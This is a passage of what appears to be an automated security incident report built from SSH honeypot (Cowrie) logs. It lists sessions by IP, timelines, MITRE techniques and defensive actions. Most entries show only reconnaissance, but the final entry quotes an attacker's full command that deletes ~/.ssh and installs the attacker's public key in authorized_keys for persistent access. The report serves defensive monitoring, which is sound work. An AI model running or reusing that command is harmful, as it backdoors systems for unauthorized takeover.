| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.log.closed` |
| `2026-09-21 11:47:44` | `cowrie.session.params` |
| `2026-09-21 11:47:44` | `cowrie.command.input` |
| `2026-09-21 11:47:45` | `cowrie.log.closed` |
| `2026-09-21 11:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036411214691

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:48 |
| **Last Seen** | 2026-09-21 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:48:36` | `cowrie.session.connect` |
| `2026-09-21 11:48:36` | `cowrie.client.version` |
| `2026-09-21 11:48:36` | `cowrie.client.kex` |
| `2026-09-21 11:48:36` | `cowrie.login.success` |
| `2026-09-21 11:48:37` | `cowrie.session.params` |
| `2026-09-21 11:48:37` | `cowrie.command.input` |
| `2026-09-21 11:48:37` | `cowrie.log.closed` |
| `2026-09-21 11:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3c04bdbfe7

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:51 |
| **Last Seen** | 2026-09-21 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:51:17` | `cowrie.session.connect` |
| `2026-09-21 11:51:17` | `cowrie.client.version` |
| `2026-09-21 11:51:17` | `cowrie.client.kex` |
| `2026-09-21 11:51:18` | `cowrie.login.success` |
| `2026-09-21 11:51:18` | `cowrie.session.params` |
| `2026-09-21 11:51:18` | `cowrie.command.input` |
| `2026-09-21 11:51:18` | `cowrie.log.closed` |
| `2026-09-21 11:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6394b3dfa03e

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 11:52 |
| **Last Seen** | 2026-09-21 11:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:52:31` | `cowrie.session.connect` |
| `2026-09-21 11:52:31` | `cowrie.client.version` |
| `2026-09-21 11:52:31` | `cowrie.client.kex` |
| `2026-09-21 11:52:32` | `cowrie.login.success` |
| `2026-09-21 11:52:34` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:52:34` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:52:34` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:52:35` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:52:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:52:35` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:52:37` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:52:37` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:52:37` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a7dc99feaee

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:53 |
| **Last Seen** | 2026-09-21 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:53:58` | `cowrie.session.connect` |
| `2026-09-21 11:53:58` | `cowrie.client.version` |
| `2026-09-21 11:53:58` | `cowrie.client.kex` |
| `2026-09-21 11:53:58` | `cowrie.login.success` |
| `2026-09-21 11:53:59` | `cowrie.session.params` |
| `2026-09-21 11:53:59` | `cowrie.command.input` |
| `2026-09-21 11:53:59` | `cowrie.log.closed` |
| `2026-09-21 11:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93057d1646c4

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:56 |
| **Last Seen** | 2026-09-21 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:56:38` | `cowrie.session.connect` |
| `2026-09-21 11:56:38` | `cowrie.client.version` |
| `2026-09-21 11:56:38` | `cowrie.client.kex` |
| `2026-09-21 11:56:38` | `cowrie.login.success` |
| `2026-09-21 11:56:38` | `cowrie.session.params` |
| `2026-09-21 11:56:38` | `cowrie.command.input` |
| `2026-09-21 11:56:39` | `cowrie.log.closed` |
| `2026-09-21 11:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e318b25ee464

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:59 |
| **Last Seen** | 2026-09-21 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:59:17` | `cowrie.session.connect` |
| `2026-09-21 11:59:17` | `cowrie.client.version` |
| `2026-09-21 11:59:17` | `cowrie.client.kex` |
| `2026-09-21 11:59:17` | `cowrie.login.success` |
| `2026-09-21 11:59:18` | `cowrie.session.params` |
| `2026-09-21 11:59:18` | `cowrie.command.input` |
| `2026-09-21 11:59:18` | `cowrie.log.closed` |
| `2026-09-21 11:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c8898586a8

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:02 |
| **Last Seen** | 2026-09-21 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:02:07` | `cowrie.session.connect` |
| `2026-09-21 12:02:07` | `cowrie.client.version` |
| `2026-09-21 12:02:07` | `cowrie.client.kex` |
| `2026-09-21 12:02:07` | `cowrie.login.success` |
| `2026-09-21 12:02:08` | `cowrie.session.params` |
| `2026-09-21 12:02:08` | `cowrie.command.input` |
| `2026-09-21 12:02:08` | `cowrie.log.closed` |
| `2026-09-21 12:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c6d0388259

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:04 |
| **Last Seen** | 2026-09-21 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:04:54` | `cowrie.session.connect` |
| `2026-09-21 12:04:54` | `cowrie.client.version` |
| `2026-09-21 12:04:54` | `cowrie.client.kex` |
| `2026-09-21 12:04:55` | `cowrie.login.success` |
| `2026-09-21 12:04:55` | `cowrie.session.params` |
| `2026-09-21 12:04:55` | `cowrie.command.input` |
| `2026-09-21 12:04:55` | `cowrie.log.closed` |
| `2026-09-21 12:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffcdf0fb926

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:07 |
| **Last Seen** | 2026-09-21 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:07:42` | `cowrie.session.connect` |
| `2026-09-21 12:07:42` | `cowrie.client.version` |
| `2026-09-21 12:07:42` | `cowrie.client.kex` |
| `2026-09-21 12:07:42` | `cowrie.login.success` |
| `2026-09-21 12:07:43` | `cowrie.session.params` |
| `2026-09-21 12:07:43` | `cowrie.command.input` |
| `2026-09-21 12:07:43` | `cowrie.log.closed` |
| `2026-09-21 12:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9683b3a7ecc

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:10 |
| **Last Seen** | 2026-09-21 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:10:22` | `cowrie.session.connect` |
| `2026-09-21 12:10:22` | `cowrie.client.version` |
| `2026-09-21 12:10:22` | `cowrie.client.kex` |
| `2026-09-21 12:10:22` | `cowrie.login.success` |
| `2026-09-21 12:10:23` | `cowrie.session.params` |
| `2026-09-21 12:10:23` | `cowrie.command.input` |
| `2026-09-21 12:10:23` | `cowrie.log.closed` |
| `2026-09-21 12:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a824c15c39f2

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:13 |
| **Last Seen** | 2026-09-21 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:13:02` | `cowrie.session.connect` |
| `2026-09-21 12:13:02` | `cowrie.client.version` |
| `2026-09-21 12:13:02` | `cowrie.client.kex` |
| `2026-09-21 12:13:02` | `cowrie.login.success` |
| `2026-09-21 12:13:03` | `cowrie.session.params` |
| `2026-09-21 12:13:03` | `cowrie.command.input` |
| `2026-09-21 12:13:03` | `cowrie.log.closed` |
| `2026-09-21 12:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47dec639eef5

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:15 |
| **Last Seen** | 2026-09-21 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:15:49` | `cowrie.session.connect` |
| `2026-09-21 12:15:49` | `cowrie.client.version` |
| `2026-09-21 12:15:49` | `cowrie.client.kex` |
| `2026-09-21 12:15:49` | `cowrie.login.success` |
| `2026-09-21 12:15:50` | `cowrie.session.params` |
| `2026-09-21 12:15:50` | `cowrie.command.input` |
| `2026-09-21 12:15:50` | `cowrie.log.closed` |
| `2026-09-21 12:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b10f60e59f

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:18 |
| **Last Seen** | 2026-09-21 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:18:35` | `cowrie.session.connect` |
| `2026-09-21 12:18:35` | `cowrie.client.version` |
| `2026-09-21 12:18:35` | `cowrie.client.kex` |
| `2026-09-21 12:18:36` | `cowrie.login.success` |
| `2026-09-21 12:18:36` | `cowrie.session.params` |
| `2026-09-21 12:18:36` | `cowrie.command.input` |
| `2026-09-21 12:18:36` | `cowrie.log.closed` |
| `2026-09-21 12:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb670914c63

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 12:21 |
| **Last Seen** | 2026-09-21 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:21:26` | `cowrie.session.connect` |
| `2026-09-21 12:21:26` | `cowrie.client.version` |
| `2026-09-21 12:21:26` | `cowrie.client.kex` |
| `2026-09-21 12:21:26` | `cowrie.login.success` |
| `2026-09-21 12:21:27` | `cowrie.session.params` |
| `2026-09-21 12:21:27` | `cowrie.command.input` |
| `2026-09-21 12:21:27` | `cowrie.log.closed` |
| `2026-09-21 12:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96624fcccea0

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:17` | `cowrie.session.connect` |
| `2026-09-21 12:27:23` | `cowrie.login.success` |
| `2026-09-21 12:27:23` | `cowrie.session.params` |
| `2026-09-21 12:27:28` | `cowrie.log.closed` |
| `2026-09-21 12:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3bad776fdd

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:17` | `cowrie.session.connect` |
| `2026-09-21 12:27:23` | `cowrie.login.success` |
| `2026-09-21 12:27:24` | `cowrie.session.params` |
| `2026-09-21 12:27:28` | `cowrie.log.closed` |
| `2026-09-21 12:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4bc1fb44616

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:28` | `cowrie.session.connect` |
| `2026-09-21 12:27:28` | `cowrie.login.success` |
| `2026-09-21 12:27:28` | `cowrie.session.params` |
| `2026-09-21 12:27:33` | `cowrie.log.closed` |
| `2026-09-21 12:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21f1a195f6a

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:28` | `cowrie.session.connect` |
| `2026-09-21 12:27:28` | `cowrie.login.success` |
| `2026-09-21 12:27:29` | `cowrie.session.params` |
| `2026-09-21 12:27:33` | `cowrie.log.closed` |
| `2026-09-21 12:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a61cfef113

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:33` | `cowrie.session.connect` |
| `2026-09-21 12:27:33` | `cowrie.login.success` |
| `2026-09-21 12:27:33` | `cowrie.session.params` |
| `2026-09-21 12:27:38` | `cowrie.log.closed` |
| `2026-09-21 12:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd19c5819c3

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:33` | `cowrie.session.connect` |
| `2026-09-21 12:27:33` | `cowrie.login.success` |
| `2026-09-21 12:27:34` | `cowrie.session.params` |
| `2026-09-21 12:27:38` | `cowrie.log.closed` |
| `2026-09-21 12:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82452838f603

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:33` | `cowrie.session.connect` |
| `2026-09-21 12:27:34` | `cowrie.login.success` |
| `2026-09-21 12:27:35` | `cowrie.session.params` |
| `2026-09-21 12:27:38` | `cowrie.log.closed` |
| `2026-09-21 12:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1ae28bc36a

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:38` | `cowrie.session.connect` |
| `2026-09-21 12:27:38` | `cowrie.login.success` |
| `2026-09-21 12:27:38` | `cowrie.session.params` |
| `2026-09-21 12:27:43` | `cowrie.log.closed` |
| `2026-09-21 12:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b794c9cec87

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:38` | `cowrie.session.connect` |
| `2026-09-21 12:27:38` | `cowrie.login.success` |
| `2026-09-21 12:27:39` | `cowrie.session.params` |
| `2026-09-21 12:27:43` | `cowrie.log.closed` |
| `2026-09-21 12:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe73001d8ba5

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:38` | `cowrie.session.connect` |
| `2026-09-21 12:27:39` | `cowrie.login.success` |
| `2026-09-21 12:27:39` | `cowrie.session.params` |
| `2026-09-21 12:27:43` | `cowrie.log.closed` |
| `2026-09-21 12:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b7ccadd0849

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:43` | `cowrie.session.connect` |
| `2026-09-21 12:27:43` | `cowrie.login.success` |
| `2026-09-21 12:27:43` | `cowrie.session.params` |
| `2026-09-21 12:27:48` | `cowrie.log.closed` |
| `2026-09-21 12:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756133b38898

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:43` | `cowrie.session.connect` |
| `2026-09-21 12:27:43` | `cowrie.login.success` |
| `2026-09-21 12:27:44` | `cowrie.session.params` |
| `2026-09-21 12:27:48` | `cowrie.log.closed` |
| `2026-09-21 12:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca4b1725208

| Field | Detail |
|---|---|
| **Source IP** | `98.70.48[.]241` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
